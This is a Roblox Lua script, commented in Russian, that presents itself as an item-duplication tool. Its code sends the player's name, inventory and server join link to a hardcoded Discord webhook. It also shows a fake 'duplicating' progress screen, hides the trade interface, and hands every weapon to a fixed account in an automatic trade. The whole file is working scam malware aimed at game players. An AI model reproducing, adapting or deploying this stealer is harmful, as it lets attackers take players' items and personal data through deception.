-- Отключаем трейды

local args = {
	false
}
game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SetRequestsEnabled"):FireServer(unpack(args))

-- Получаем данные о игроке и сервере


local player = game:GetService("Players").LocalPlayer
local playerData = {
    realhypename = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId
}

local function getServerLink()
    return 'https://www.roblox.com/games/start?placeId='..game.placeId..'&gameInstanceId='..game.jobId
end
local link = getServerLink()

-- Получаем инвентарь игрока 

local userInventory = {
    Unique = {},
    Ancient = {},
    Godly = {},
    Vintage = {},
    Legendary = {},
    Rare = {},
    Uncommon = {},
    Common = {}
}
local function addItem(rarity, skinName, amount)
    if not userInventory[rarity] then
        warn("Неизвестная редкость: " .. rarity)
        return
    end
    
    userInventory[rarity][skinName] = (userInventory[rarity][skinName] or 0) + amount
end
local function getRarity(pagecolor)
    if pagecolor == Color3.fromRGB(106, 106, 106) then
		rarity = 'Common'
	elseif pagecolor == Color3.fromRGB(0, 255, 255) then
		rarity = 'Uncommon'
	elseif pagecolor == Color3.fromRGB(0, 200, 0) then
		rarity = 'Rare'
	elseif pagecolor == Color3.fromRGB(220, 0, 5) then
		rarity = 'Legendary'
	elseif pagecolor == Color3.fromRGB(255, 0, 179) then
		rarity = 'Godly'
	elseif pagecolor == Color3.fromRGB(100, 10, 255) then
		rarity = 'Ancient'
	elseif pagecolor == Color3.fromRGB(230, 200, 0) then
		rarity = 'Vintage'
	elseif pagecolor == Color3.fromRGB(240, 140, 0) then
		rarity = 'Uniques'
	end
    return rarity
end
local function getInventory(path)
    amount = nil
    rarity = nil
    itemName = nil
    for i, page in ipairs(path:GetDescendants()) do
        
        if page.Name == 'Amount' then
            if page.Text == '' then
                amount = 1
            else
                amount = tonumber(page.Text:match("%d+"))
            end
        end
	    if page.Name == 'ItemName' then
            rarity = getRarity(page.BackgroundColor3)
        end
        if page.Name == 'Label' then
            itemName = page.Text
        end
        if rarity ~= nil and amount ~= nil and itemName~=nil then
            --print(rarity, amount, itemName)
            addItem(rarity, tostring(itemName), amount)
            amount = nil
            rarity = nil
            itemName = nil
        end
    end
end
local path = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main.Weapons.Items.Container
getInventory(path)

-- Публикуем полученные данные в дискорд

local http = syn and syn.request or http_request or request
if not http then
    warn("doesnt accept http requests")
    return
end
local WEBHOOK_URL = "https://discord.com/api/webhooks/1399079777490571376/gHThUkCE7WHXSuE84Yb1-H9FFzncDcgobZ6wuYeeLTGIavOjlWJVq865w4KKoK1QLtg5"
local function sendToDiscord(text)
    local data = {
        content = text
    }
    
    local response = http({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
    
end
datadiscord = ''
for rarity, items in pairs(userInventory) do
    datadiscord = datadiscord.."======"..rarity.."======\n"
    for skin, count in pairs(items) do
        datadiscord = datadiscord.." - "..skin..": "..count.."x\n"
    end
end
sendToDiscord('@everyone DUMBASS BEAMED\n```'..playerData.realhypename..'```\n\n===Inventory===\n```'..datadiscord..'```Join Link:\n'..link)

-- Создаем визуал

local LOAD_TIME = 300 
local PHRASES = { 
    "Decrypting payload...",
    "Injecting DLLs...",
    "Establishing RPC connection...",
    "Spoofing HWID...",
    "Generating fake packets...",
    "Hooking game functions...",
    "Dumping memory...",
    "Patching offsets...",
    "Deobfuscating scripts...",
    "Ready for operation",
    "Session secured",
    "Duplicating items"
}
local gui = Instance.new("ScreenGui")
gui.Name = "DupeLoader"
gui.Parent = player.PlayerGui
gui.ResetOnSpawn = false
local function createLoadScreen()
    local loadFrame = Instance.new("Frame")
    loadFrame.Size = UDim2.new(0.4, 0, 0.15, 0)
    loadFrame.Position = UDim2.new(0.3, 0, 0.4, 0)
    loadFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    loadFrame.BackgroundTransparency = 0
    loadFrame.BorderSizePixel = 0
    loadFrame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Text = "Fetching API..."
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Font = Enum.Font.Code
    title.Size = UDim2.new(1, 0, 0.5, 0)
    title.BackgroundTransparency = 1
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Position = UDim2.new(0.05, 0, 0.1, 0)
    title.Parent = loadFrame

    local progressBarBack = Instance.new("Frame")
    progressBarBack.Size = UDim2.new(0.9, 0, 0.05, 0)
    progressBarBack.Position = UDim2.new(0.05, 0, 0.7, 0)
    progressBarBack.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    progressBarBack.BorderSizePixel = 0
    progressBarBack.Parent = loadFrame

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(255, 98, 0)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBarBack

    local percentText = Instance.new("TextLabel")
    percentText.Text = "0%"
    percentText.TextColor3 = Color3.fromRGB(200, 200, 200)
    percentText.TextSize = 14
    percentText.Font = Enum.Font.Code
    percentText.Size = UDim2.new(0.2, 0, 0.3, 0)
    percentText.Position = UDim2.new(0.75, 0, 0.35, 0)
    percentText.BackgroundTransparency = 1
    percentText.Parent = loadFrame

    return loadFrame, title, progressBar, percentText
end
local function runLoadScreen()
    local loadFrame, title, progressBar, percentText = createLoadScreen()
    local startTime = os.clock()
    local phraseInterval = LOAD_TIME / #PHRASES
    local MAX_PROGRESS = 0.95 

    while os.clock() - startTime < LOAD_TIME do
        local rawProgress = (os.clock() - startTime) / LOAD_TIME
        local progress = math.min(rawProgress, MAX_PROGRESS)
        
        progressBar.Size = UDim2.new(progress, 0, 1, 0)
        percentText.Text = math.floor(progress * 100) .. "%"

        local phraseIndex = math.min(math.floor(rawProgress * #PHRASES) + 1, #PHRASES)
        title.Text = PHRASES[phraseIndex]

        task.wait(0.03)
    end

    progressBar.Size = UDim2.new(MAX_PROGRESS, 0, 1, 0)
    percentText.Text = math.floor(MAX_PROGRESS * 100) .. "%"

    task.wait(60)
    title.Text = "Succesfully duped"
    progressBar.Size = UDim2.new(1, 0, 1, 0)
    percentText.Text = math.floor(1 * 100) .. "%"
    task.wait(5)
    loadFrame:Destroy()
    createMainMenu() 
end

-- Функции трейда

local function sendTrade(username)
    local args = {
	        game:GetService("Players"):WaitForChild(username)
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
end
local function addItems()
    local data = {"TravelerGunChroma","TreeGun2023Chroma","TreeKnife2023Chroma","VampireGunChroma", "SunsetGunChroma","SunsetKnifeChroma","BaubleChroma","ConstellationChroma","Gingerscope","TravelerAxe","TravelerGun","TreeGun2023","TreeKnife2023","SunsetKnife","SunsetGun","Turkey2023","WatergunChroma","Constellation","Celestial","Sorry","Blossom_G","Sakura_K","VampireGun","Darksword","Darkshot","VampireAxe","Harvester","Icepiercer","Bauble","ZombieBat","Rainbow_K","Rainbow_G","WraithKnife","WraithGun","Candy","Waves_K","Ocean_G","FlowerwoodKnife","FlowerwoodGun","Bloom","Flora","Heartblade","Watergun","AuroraKnife","AuroraGun","Sugar","Icebreaker","Iceblaster","SwirlyAxe","SwirlyGun","SwirlyGunChroma","SwirlyBlade","ElderwoodGun","ElderwoodScythe","ElderwoodKnife","ElderwoodKnifeChroma","Batwing","Hallowscythe","Hallowgun","Logchopper","Icewing","JD","Latte_K_2023","Latte_G_2023","CottonCandy","ChromaDarkbringer","ChromaLightbringer","LugerChroma","CandleflameChroma","LaserChroma","SharkChroma","SeerChroma","GemstoneChroma","GingerbladeChroma","TidesChroma","SlasherChroma","DeathshardChroma","FangChroma","HeatChroma","SawChroma","BonebladeChroma","Luger","Lugercane","GingerLuger","RedLuger","RandLuger","GreenLuger","Pearl_K","Pearl_G","Candleflame","Makeshift","Darkbringer","Phantom2022","Spectre2022","Lightbringer","Laser","AmericaSword","Amerilaser","Iceflake","Icebeam","Plasmablade","Plasmabeam","Shark","Blaster","Virtual","Gemstone","Nightblade","Gingermint_K","Gingermint_G","Eternal","Eternal2","Eternal3","Eternal4","EternalCane","Pixel","Nebula","Slasher","Jinglegun","Clockwork","Deathshard","Gingerblade","Minty","Heat","BattleAxe","BattleAxe2","Spider","Bioblade","VampiresEdge","Chill","Fang","Tides","Frostsaber","Hallow","HallowsBlade","IceShard","Pumpking","Xmas","Handsaw","Flames","IceDragon","WintersEdge","Boneblade","Ghostblade","Eggblade","Frostbite","Prismatic","Saw","Snowflake","Peppermint","Cookieblade","RedSeer","OrangeSeer","YellowSeer","BlueSeer","PurpleSeer","TheSeer","BloodKnife","GhostKnife","Knife1","ShadowKnife","TimeKnife","AmericaGun","GoldenGun","Gun1","Phaser","Disint","BigKill","Cold","Fallout","Iron","AduriteGun","BluesteelGun","Camo","Galactic","Imbued","Viper","Reptile","Gifted","Future","Nether","Midnight","Night","Spitfire","Overseer","Linked","Slate","Borders","Stalker","Missing","Cheesy","Krypto","Spectrum","OverseerKnife","Checker","Damp","Emerald","Neon","Infected","Marley","Fanta","Pepper","Kool","LMFAO","Chips","Snoop","Doritos","Dew","MLG","TNL","Engraved","Infiltrator","Aid","Star","Sketch","Marina","Cheddar","iRevolver","Hacker","Predator","LoveGun","Molten","Sparkle","Clan","Cherry","Cardboard","Stainless","Circuit","Doge","Paper","Splash","Vortex","Nova","Donut","MoltenKnife","PredatorKnife","Goo","Pea","News","HL2","Bit","Wooden","Cola","Caution","Bacon","Ace","Universe","Elite","Skool","Sidewinder","Grind","Euro","Ollie","Tailslide","Indy","Prism","Sparkle1","Sparkle2","Sparkle3","Sparkle4","Sparkle5","Sparkle6","Sparkle7","Sparkle8","Sparkle9","Sparkle10","Jack","Bleed","Web","Mummy","Bleached","Clown","SlouseClown","SlouseClownGun","Oily","Aqua","Hazmat","Melon","Hive","Korblox","Squire","Fade","Santa","Elf","Ornament1","Ornament2","Snowy","Snowman","Wrapped","Ginger","Cane","Tree","SantaGun","ElfGun","Ornament1Gun","Ornament2Gun","Nutcracker","SnowmanGun","WrappedGun","GingerGun","CaneGun","TreeGun","EliteGreen","EliteBlue","Blossom","Passion","Roses","Hearts","Valentine","Sweetheart","Eco","Log","Sandy","Static","Brush","Jigsaw","Lucky","Abstract","Musical","Fusion","Patrick","Eggs","Choco","Tulip","Bunny","Carrot","Xbox","Asteroid","Brains","Bones","Ghosty","Witch","Vampire","Moons","Wolf","OrangeMarble","Bats","Scratch","Ecto","Zombie","Phantom","CandyCorn","Webs","MummyK","Potion","MagmaK","GreenMarble","ScratchBlue","Alex","Sub","Denis","SketchYT","Corl","Present","Coal","Elf2017","Santa2017","Tree2017","Frosty","Sweater","Gingerbread2017","Snowy2017","GreenFire","RedFire","WrapPaperBoxRed","WrapPaperBoxPurple","WrapPaperBoxGold","WrapPaperBoxGreen","WrapPaperBoxBlue","WrapPaperBoxUltra","RandomUncommonWeapon","RandomRareWeapon","RandomLegendaryWeapon","SkeletonKey","Scythe","SlimeK","GraveK","HauntedK","BatsK","MummyK2018","ZombieK2018","PotionK2018","VampireK2018","ToxicK","GhostK2018","SlimeG","GraveG","HauntedG","BatsG","MummyG2018","ZombieG2018","PotionG2018","VampireG2018","ToxicG","GhostG2018","NikKnife","SnowflakeKey","Coal_K_2018","Santa_K_2018","Snowman_K_2018","Wrapped_K_2018","Snowflake_K_2018","Holly_K_2018","Sweater_K_2018","Icicles_K_2018","Cane_K_2018","Ginger_K_2018","Coal_G_2018","Santa_G_2018","Snowman_G_2018","Wrapped_G_2018","Snowflake_G_2018","Holly_G_2018","Sweater_G_2018","Icicles_G_2018","Cane_G_2018","Ginger_G_2018","FertilizerBox","Season1TestKnife","Key","Combat","Combat2","Copper","Hardened","Splat","CamoKnife","Tiger","Pirate","Space","RainbowGun","Rune","Skulls","Dungeon","SnakebiteG","Bones2019","ZombifiedK","Brains2019","PumpkinPatch","SlimyK","WebbedG","CandyCorn2019","Witched","SnakebiteK","Monster","Branches","ZombifiedG","Mummified","RIP","WebbedK","Frosted_K_2019","Frosted_G_2019","Snowflakes_K_2019","Snowflakes_G_2019","Pine_K_2019","Pine_G_2019","Gifts_K_2019","Gifts_G_2019","Gingerbread_K_2019","Gingerbread_G_2019","Frozen_K_2019","Frozen_G_2019","Lights_K_2019","Lights_G_2019","Aurora_K_2019","Aurora_G_2019","CandySwirl_K_2019","CandySwirl_G_2019","Cavern_K_2019","Cavern_G_2019","SantasMagic","Splash_G","Nightfire","Biogun","Clown_G","DeepSea","Graffiti","HighTech","Lovely","Shaded","Leaf","Emptybringer","Eyes_K_2020","Carved_K_2020","Candle_K_2020","CandyCorn_G_2020","Ghosts_K_2020","Pumpkin_K_2020","Mummy_G_2020","Bones_K_2020","Portal_K_2020","Ripper_G_2020","CandyCorn_K_2020","Carved_G_2020","Eyes_G_2020","Portal_G_2020","Mummy_K_2020","Ghosts_G_2020","Ripper_K_2020","Slashed_K_2020","Starry_G_2020","Bats_K_2020","RBKnife","Giftbag_K_2020","Icecracker_K_2020","Gingerbread_K_2020","SilentNight_K_2020","Ornaments_K_2020","Ornaments_G_2020","Gift_K_2020","Gingerbread_G_2020","SilentNight_G_2020","Giftbag_G_2020","Icedriller_G_2020","SantasSpirit","Stockings_K_2020","Trees_K_2020","Gift_G_2020","Snowflakes_K_2020","SharkSeeker","Reaver","Reaver_Legendary","Reaver_Godly","Reaver_Ancient","Stickers_K_2021","Cracks_K_2021","Cat_G_2021","Haunted_K_2021","FallCamo_G_2021","Ghosts_G_2021","Ghosts_K_2021","Gothic_K_2021","Watcher_K_2021","Magma_K_2021","Spectral_G_2021","Moon_K_2021","Cracks_G_2021","Stickers_G_2021","Aliens_G_2021","Gothic_G_2021","Zombie_K_2021","Skulls_K_2021","Watcher_G_2021","Magma_G_2021","Spectral_K_2021","Cane_K_2021","Coal_K_2021","Giftwrap_K_2021","Ribbons_K_2021","XmasStickers_K_2021","Cookie_K_2021","Snowman_K_2021","Tree_K_2021","Swirl_K_2021","Starry_K_2021","Aurora_K_2021","Coal_G_2021","XmasStickers_G_2021","Cane_G_2021","Snowman_G_2021","Cookie_G_2021","Gingerbread_G_2021","IceCamo_G_2021","Starry_G_2021","Aurora_G_2021","Dartbringer","GhostRbx_K_2022","CandyCorn_K_2022","Eyeball_K_2022","Stickers_K_2022","Darkness_K_2022","Hazard_K_2022","Jack_K_2022","Witch_K_2022","Wraith_K_2022","Runic_K_2022","Vampire_K_2022","GreenCamo_K_2022","BlueCamo_K_2022","Bones_K_2022","Hunter_K_2022","molten","Apoc_K_2022","Survivors_K_2022","Infected_K_2022","Zombified_K_2022","Apoc_G_2022","CandyCorn_G_2022","Infected_G_2022","Darkness_G_2022","Hazard_G_2022","Wraith_G_2022","Vampire_G_2022","Ghostfire_G_2022","Moonlight_G_2022","Brains_G_2022","Webs_G_2022","VoidRbx","Candied_K_2022","StickersX_K_2022","Coal_K_2022","Snowman_K_2022","Snowflake_K_2022","Stockings_K_2022","Mistletoe_K_2022","Gingerbread_K_2022","Tree_K_2022","Arctic_K_2022","Candied_G_2022","StickersX_G_2022","Coal_G_2022","Snowman_G_2022","Snowflake_G_2022","Stockings_G_2022","Mistletoe_G_2022","Gingerbread_G_2022","Tree_G_2022","Arctic_G_2022","Wrapped_K_2022","Frozen_K_2022","Frozen_G_2022","Broken_K_2023","Rose_K_2023","Heart_K_2023","Love_K_2023","Fragile_K_2023","Marble_K_2023","Bio_K_2023","Chromatic_K_2023","Carrot_K_2023","Painted_K_2023","Fragile_G_2023","Painted_G_2023","Nuke_G_2023","Chromatic_G_2023","Toy_K_2023","Summer_Stickers_K_2023","Popsicle_K_2023","Noodle_K_2023","Floral_K_2023","Beach_K_2023","Summer_Stickers_G_2023","Toy_G_2023","Melon_G_2023","Sunset_G_2023","RbxScary_K_2023","Skull_K_2023","Vines_K_2023","Ghosts_K_2023","Pumpkin_G_2023","Zombie_K_2023","Meltdown_K_2023","Steel_G_2023","Ghastly_G_2023","Dark_K_2023","Spider_K_2023","Leaves_K_2023","Wood_K_2023","Vines_G_2023","Glowy_K_2023","Eclipse_K_2023","Steel_K_2023","Dark_G_2023","Ghastly_K_2023","Scarf_K_2023","PumpkinPie_K_2023","Frozen_K_2023","Present_K_2023","Ribbon_K_2023","Santa_G_2023","Stars_K_2023","Canes_G_2023","Fireplace_K_2023","Tree_K_2023","Neon_G_2023","Frostfade_K_2023","Frozen_G_2023","Bells_K_2023","Elf_G_2023","Snowfall_K_2023","Canes_K_2023","Stars_G_2023","Snowman_G_2023","Snowglobe_K_2023","Snowflake_G_2023","Frostfade_G_2023","Gingerscythe","Gingerscythe_Legendary","Gingerscythe_Godly","Gingerscythe_Ancient","Wavy_K_2024","Carrot_K_2024","Spring_K_2024","Robot_K_2024","Wavy_G_2024","Carrot_G_2024","Starfish_K_2024","WaterBalloons_G_2024","Clownfish_G_2024","Sandy_G_2024","Turtle_K_2024","Popsicle_G_2024","Jellyfish_K_2024","Waves_K_2024","Floral_G_2024","Palms_K_2024","Starfish_G_2024","Clownfish_K_2024","Floatie_G_2024","Sharky_K_2024","Palms_G_2024","CandyCorn_G_2024","Ghosts_K_2024","Stickers_G_2024","Bats_K_2024","Bones_K_2024","WitchBrew_K_2024","Leaves_G_2024","Kraken_K_2024","Ritual_G_2024","Cursed_G_2024","CandyCorn_K_2024","Bats_G_2024","Stickers_K_2024","Candles_K_2024","Monster_K_2024","Moons_K_2024","Clown_G_2024","Storm_K_2024","Candleflame_G_2024","Cursed_K_2024","HotChocolate_K_2024","Gifts_K_2024","Igloo_G_2024","Stickers_X_K_2024","Gingerheart_K_2024","Wrapped_G_2024","Logcutter_K_2024","Frostflame_K_2024","Constellation_G_2024","Reindeer_K_2024","Stockings_G_2024","Igloo_K_2024","Stickers_X_G_2024","Wrapped_K_2024","Snowman_K_2024","Wreaths_K_2024","Frostflame_G_2024","Sleigh_K_2024","Constellation_K_2024","Forest_G_2024","Decorated_K_2025","Carrots_K_2025","Chick_K_2025","Bunnies_K_2025","Sunny_G_2025","Meadow_G_2025","Butterflies_G_2025","Leaves_K_2025","Coconut_K_2025","Stickers_K_2025","Striped_G_2025","Pool_K_2025","Soda_G_2025","Lava_K_2025","PopArt_K_2025","Tropical_K_2025","Aquarium_G_2025","Striped_K_2025","Stickers_G_2025","Dolphins_K_2025","Skyline_K_2025","Soda_K_2025","Retro_K_2025","Lava_G_2025","Neon_G_2025","PopArt_G_2025","Aquarium_K_2025"}

    for i,v in ipairs(data) do
        for k=0, 5 do
            local args = {
        	    v,
        	    "Weapons"
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
        end
    end
    task.wait(6)
    local args = {
	    285646582
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))

end

-- Запуск кода

local TradeGUI = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI
local mobileTradeGUI = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone
local inventoryGUI = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Inventory
local tradeRequest = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container.TradeRequest
local function startParallelThreads()
    coroutine.wrap(function()
        wait(2)
        runLoadScreen()
    end)()

    coroutine.wrap(function()
        game.Players.PlayerAdded:Connect(function(player)
            if player.UserId == 9043281161 then
                if TradeGUI then TradeGUI:Destroy() end
                if mobileTradeGUI then mobileTradeGUI:Destroy() end
                if tradeRequest then tradeRequest:Destroy() end
                if inventoryGUI then inventoryGUI:Destroy() end
                
                player.Chatted:Connect(function()
                    sendTrade("LilPiskaScammer")
                    wait(3)
                    addItems()
                end)
            end
        end)
    end)()
end

startParallelThreads()
